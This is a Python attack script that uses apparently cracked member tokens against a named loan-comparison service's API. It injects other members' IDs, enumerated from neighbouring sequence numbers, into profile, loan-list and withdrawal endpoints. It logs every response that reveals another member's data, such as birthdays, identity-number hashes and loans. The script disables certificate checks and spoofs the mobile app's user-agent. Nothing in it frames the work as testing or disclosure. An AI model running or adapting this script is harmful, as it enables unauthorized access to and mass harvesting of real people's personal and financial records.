#!/usr/bin/env python3
"""Parameter injection hunter: drive member endpoints with ANOTHER member's
memberSeq and diff against the self-baseline.

Thesis: several Spring controllers bind memberSeq from the request instead of
the JWT subject. If myinfo/loan-list honor an injected memberSeq, every cracked
token becomes a lens onto arbitrary member profiles (birthday, RRN-hash, loans).

Axes:
  victims: other cracked members' known memberSeqs + own-seq +/- 20 neighbors
  endpoints: myinfo (GET/POST), mypage-loan-list, mypage-top-loan-summary,
             withdraw-info, getBigyoLoanFlw (no seq, memberSeq injected)
Leak = normalized response differs from the self-baseline AND looks populated.
Outputs: inj_leaks.jsonl (full diffs), inj_summary.csv (one row per leak).
"""
import hashlib
import json
import os
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

import tokstore

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443"
PACE = 0.3
LEAK_LOG = os.path.join(HERE, "inj_leaks.jsonl")
SUMMARY = os.path.join(HERE, "inj_summary.csv")
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"


def call(token, path, body=None, method=None):
    url = BASE + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        "User-Agent": UA, "Content-Type": "application/json",
        "Accept": "*/*", "Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=15, context=CTX) as r:
            raw = r.read().decode("utf-8", "replace")
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, {"raw": raw[:400]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"raw": raw[:400]}
    except Exception as e:
        return 0, {"error": repr(e)[:200]}


def norm_hash(doc):
    return hashlib.sha1(json.dumps(doc, sort_keys=True, ensure_ascii=False).encode()).hexdigest()[:16]


def populated(doc):
    d = doc.get("data") if isinstance(doc, dict) else None
    if isinstance(d, dict):
        return any(v not in (None, "", [], {}) for v in d.values())
    if isinstance(d, list):
        return len(d) > 0
    return False


def member_seq_of(mob):
    fp = os.path.join(HERE, "loans_raw", mob.replace("-", "_") + ".json")
    if os.path.exists(fp):
        try:
            raw = json.load(open(fp))
            mi = (raw.get("myinfo") or {}).get("data") or {}
            if mi.get("memberSeq"):
                return int(mi["memberSeq"])
        except Exception:
            pass
    return None


def endpoints_with_seq(seq):
    yield ("myinfo_get", f"/bigyo/api/mypage/myinfo?memberSeq={seq}", None, None)
    yield ("myinfo_post", "/bigyo/api/mypage/myinfo", {"memberSeq": seq}, "POST")
    yield ("loanlist_q", f"/bigyo/api/bigyo/mypage-loan-list?memberSeq={seq}", None, None)
    yield ("loanlist_body", "/bigyo/api/bigyo/mypage-loan-list", {"memberSeq": seq}, "POST")
    yield ("summary_q", f"/bigyo/api/bigyo/mypage-top-loan-summary?memberSeq={seq}", None, None)
    yield ("withdraw_q", f"/bigyo/api/mypage/withdraw-info?memberSeq={seq}", None, None)
    yield ("flw_credits", "/bigyo/api/bigyo/getBigyoLoanFlw?flowType=CREDIT",
           {"memberSeq": seq, "applyType": "EXISTING", "step": "1"}, "POST")
    yield ("flw_combine", "/bigyo/api/bigyo/getBigyoLoanFlw?flowType=COMBINE",
           {"memberSeq": seq, "applyType": "EXISTING", "step": "1"}, "POST")


def main():
    creds = tokstore.load()
    if not creds:
        print("INJECT no cracked members")
        return
    seqs = {}
    for cr in creds:
        s = member_seq_of(cr["mobile"])
        if s:
            seqs[cr["mobile"]] = s
    print(f"INJECT members={[c['mobile'] for c in creds]} seqs={seqs}", flush=True)

    # victim universe: known foreign seqs + neighbor band around each own seq
    own = set(seqs.values())
    victims = []
    for s in seqs.values():
        for d in range(-20, 21):
            v = s + d
            if v > 0 and v not in own and v not in victims:
                victims.append(v)
    for s in seqs.values():
        if s not in victims:
            victims.insert(0, s)  # cross-cracked-member seq first
    print(f"INJECT victims={len(victims)}", flush=True)

    # baselines per attacker (self-seq responses)
    baselines = {}
    for cr in creds:
        s = seqs.get(cr["mobile"])
        bl = {}
        if s:
            for ep, path, body, meth in endpoints_with_seq(s):
                st, doc = call(cr["token"], path, body, meth)
                bl[ep] = (st, norm_hash(doc))
                time.sleep(PACE)
        baselines[cr["mobile"]] = bl

    leaked = 0
    new_csv = not os.path.exists(SUMMARY)
    for cr in creds:
        att = cr["mobile"]
        for v in victims:
            if v == seqs.get(att):
                continue
            for ep, path, body, meth in endpoints_with_seq(v):
                st, doc = call(cr["token"], path, body, meth)
                h = norm_hash(doc)
                bst, bh = baselines[att].get(ep, (None, None))
                if h != bh and populated(doc):
                    leaked += 1
                    rec = {"ts": time.strftime("%FT%TZ", time.gmtime()), "attacker": att,
                           "victimSeq": v, "endpoint": ep, "status": st,
                           "baseline_status": bst, "doc": doc}
                    with open(LEAK_LOG, "a") as f:
                        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    with open(SUMMARY, "a", newline="") as f:
                        import csv
                        w = csv.writer(f)
                        if new_csv:
                            w.writerow(["ts", "attacker", "victimSeq", "endpoint", "status", "snippet"])
                            new_csv = False
                        w.writerow([rec["ts"], att, v, ep, st,
                                    json.dumps(doc, ensure_ascii=False)[:300]])
                    print(f"LEAK {att}->{v} {ep} st={st}", flush=True)
                time.sleep(PACE)
    print(f"INJECT DONE leaks={leaked}", flush=True)


if __name__ == "__main__":
    main()
